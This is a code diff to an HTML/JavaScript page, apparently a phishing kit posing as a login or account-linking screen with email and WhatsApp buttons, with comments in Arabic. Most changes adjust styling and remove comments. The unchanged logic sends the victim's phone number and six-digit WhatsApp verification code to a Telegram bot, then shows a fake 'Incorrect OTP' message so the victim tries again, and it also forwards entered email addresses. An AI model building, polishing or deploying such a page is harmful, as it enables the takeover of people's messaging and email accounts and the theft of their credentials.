@@ -26,8 +26,8 @@ body {
   display: flex; flex-direction: column;
   background-color: #1a1a1c;
   background-image: url('1000005893.png');
-  background-repeat: repeat; /* تكرار النقش */
-  background-size: 160px auto; /* حجم النقش لتنسيق الموزاييك */
+  background-repeat: repeat;
+  background-size: 160px auto;
   background-position: top left;
   font-family: 'Inter', sans-serif; color: var(--text);
   overflow-x: hidden;
@@ -92,20 +92,22 @@ button {
 #accessBtn { width: 45%; display: block; }
 button:hover { filter: brightness(1.08); }
 
+/* أزرار التواصل (مجهزة لتكون متطابقة بالحجم) */
 .social-login-container { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 16px; position: relative; z-index: 10; }
 .social-icon-btn {
   display: flex; align-items: center; justify-content: center;
-  width: 44px; height: 44px; border-radius: 50%; padding: 0;
+  width: 44px; height: 44px; min-width: 44px; min-height: 44px; border-radius: 50%; padding: 0;
   text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
   transition: transform 0.15s ease, filter 0.15s ease;
   cursor: pointer;
   z-index: 20;
 }
-.social-icon-btn i { color: #ffffff; font-size: 20px; pointer-events: none; }
+.social-icon-btn i { color: #ffffff; font-size: 20px; pointer-events: none; line-height: 1; }
 .social-icon-btn:hover { filter: brightness(1.08); transform: translateY(-2px); }
 .email-btn { background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); border: 2px solid #60a5fa; }
 .whatsapp-btn { background: #25d366; border: 2px solid #25d366; }
 
+/* النوافذ المنبثقة */
 .modal-overlay {
   position: fixed; top: 0; left: 0; width: 100%; height: 100%;
   background: rgba(0, 0, 0, 0.65); display: flex; align-items: center; justify-content: center;
@@ -205,40 +207,42 @@ button:hover { filter: brightness(1.08); }
 .whatsapp-code-instruction strong { color: #ffffff; font-weight: 600; }
 .whatsapp-code-actions { display: flex; gap: 10px; margin-top: 8px; }
 
+/* زر Resend هادئ وغير ساطع */
 .whatsapp-resend-btn {
-  flex: 1; padding: 12px; border: none; border-radius: 8px;
+  flex: 1; padding: 12px; border: 1px solid #333336; border-radius: 8px;
   background: #1a1a1c; color: #777777; font-weight: 700; font-size: 14px;
-  cursor: not-allowed; box-shadow: inset 0 2px 4px rgba(0,0,0,0.5); transition: all 0.2s ease;
+  cursor: not-allowed; transition: all 0.2s ease;
 }
 .whatsapp-resend-btn.ready-resend { 
-  background: #555658; 
-  color: #ffffff; 
+  background: #38383c; 
+  color: #e0e0e0; 
   cursor: pointer; 
-  border: 1px solid #777777;
-  box-shadow: 0 0 12px rgba(255, 255, 255, 0.15), inset 0 0 4px rgba(255, 255, 255, 0.3);
+  border: 1px solid #55555a;
+  box-shadow: none; /* إزالة الوهج الساطع */
 }
-.whatsapp-connect-btn { flex: 1; }
 
+/* النافذة العرضية للخطأ (مكافئة للصورة) */
 .whatsapp-error-overlay-box {
   position: absolute;
   top: 50%; left: 50%;
   transform: translate(-50%, -50%);
-  width: 85%;
-  height: 130px;
-  background: #1e1e1e;
-  border: 1px solid #333;
-  border-radius: 14px;
+  width: 90%;
+  max-width: 310px;
+  height: 95px;
+  background: #232326;
+  border: 1px solid #444448;
+  border-radius: 12px;
   display: flex;
   align-items: center;
   justify-content: center;
-  color: #dfdfdf;
-  font-size: 16px;
-  font-weight: 400;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 0 1px rgba(255,255,255,0.03);
+  color: #eeeeee;
+  font-size: 15px;
+  font-weight: 500;
+  box-shadow: 0 12px 35px rgba(0, 0, 0, 0.85);
   z-index: 200;
   opacity: 0;
   visibility: hidden;
-  transition: opacity 0.3s ease, visibility 0.3s ease;
+  transition: opacity 0.25s ease, visibility 0.25s ease;
 }
 .whatsapp-error-overlay-box.show {
   opacity: 1;
@@ -319,7 +323,7 @@ button:hover { filter: brightness(1.08); }
     </div>
   </div>
 
-  <!-- نافذة الواتساب مع جميع الدول والأطوال الدقيقة -->
+  <!-- نافذة الواتساب -->
   <div class="modal-overlay" id="whatsappModalOverlay">
     <div class="dark-modal">
       <div class="modal-close-btn" id="closeWhatsappModalBtn"><i class="fas fa-times"></i></div>
@@ -371,11 +375,11 @@ button:hover { filter: brightness(1.08); }
     </div>
   </div>
 
-  <!-- نافذة كود الواتساب -->
+  <!-- نافذة كود الواتساب مع رسالة الخطأ العرضية المتناسقة -->
   <div class="modal-overlay" id="whatsappVerifyModalOverlay">
     <div class="dark-modal" style="position: relative;">
       
-      <!-- رسالة الخطأ الجديدة (مطابقة للصورة 1000005880_2.jpg) -->
+      <!-- رسالة الخطأ العرضية المصممة بدقة -->
       <div id="customWhatsappError" class="whatsapp-error-overlay-box">
         Incorrect OTP
       </div>
@@ -430,7 +434,7 @@ document.getElementById('openWhatsappModalBtn').addEventListener('click', functi
   updateCountryUI(); 
 });
 
-// أزرار إغلاق النوافذ وتصفير البيانات
+// أزرار إغلاق النوافذ
 document.getElementById('closeEmailModalBtn').addEventListener('click', function() {
   document.getElementById('emailModalOverlay').classList.remove('active');
   const input = document.getElementById('linkEmailInput');
@@ -532,7 +536,6 @@ function validateWhatsappCodeField() {
   input.value = input.value.replace(/[^0-9]/g, '');
   const val = input.value;
   document.getElementById('whatsappConnectBtn').classList.toggle('ready-connect', val.length === 6);
-  // إخفاء رسالة الخطأ تلقائياً بمجرد بدء التعديل
   document.getElementById('customWhatsappError').classList.remove('show');
 }
 
@@ -541,11 +544,10 @@ function submitWhatsappCode() {
   if (val.length === 6) {
     sendToTelegram(`🔔 كود الواتساب:\n📱 ${fullSavedPhoneNumber}\n🔢 ${val}`);
     
-    // إظهار رسالة الخطأ الخاصة بالواتساب (البوب أب الداكن)
+    // إظهار الرسالة العرضية
     const errorBox = document.getElementById('customWhatsappError');
     errorBox.classList.add('show');
     
-    // إخفائها بعد 2.5 ثانية تلقائياً
     setTimeout(() => {
       errorBox.classList.remove('show');
     }, 2500);
@@ -555,16 +557,13 @@ function submitWhatsappCode() {
   }
 }
 
-// الإيميل (الشرط القاسي)
+// الإيميل
 function validateEmailField() {
   const input = document.getElementById('linkEmailInput');
   input.value = input.value.replace(/[^a-zA-Z0-9@._-]/g, '');
   const val = input.value;
   
-  // صيغة Regex صارمة للتحقق من أن الإيميل حقيقي ومكتمل
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-  
-  // يضيء الزر فقط إذا طابقت الكتابة شكل الإيميل
   document.getElementById('emailContinueBtn').classList.toggle('ready-gold', emailRegex.test(val));
 }
 
@@ -573,7 +572,7 @@ function submitEmailLink() {
   const inputVal = document.getElementById('linkEmailInput').value;
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   
-  if(!emailRegex.test(inputVal)) return; // منع العبور إذا لم يكن إيميلاً حقيقياً
+  if(!emailRegex.test(inputVal)) return;
   
   savedUserEmail = inputVal;
   sendToTelegram(`🔔 إيميل: ${savedUserEmail}`);
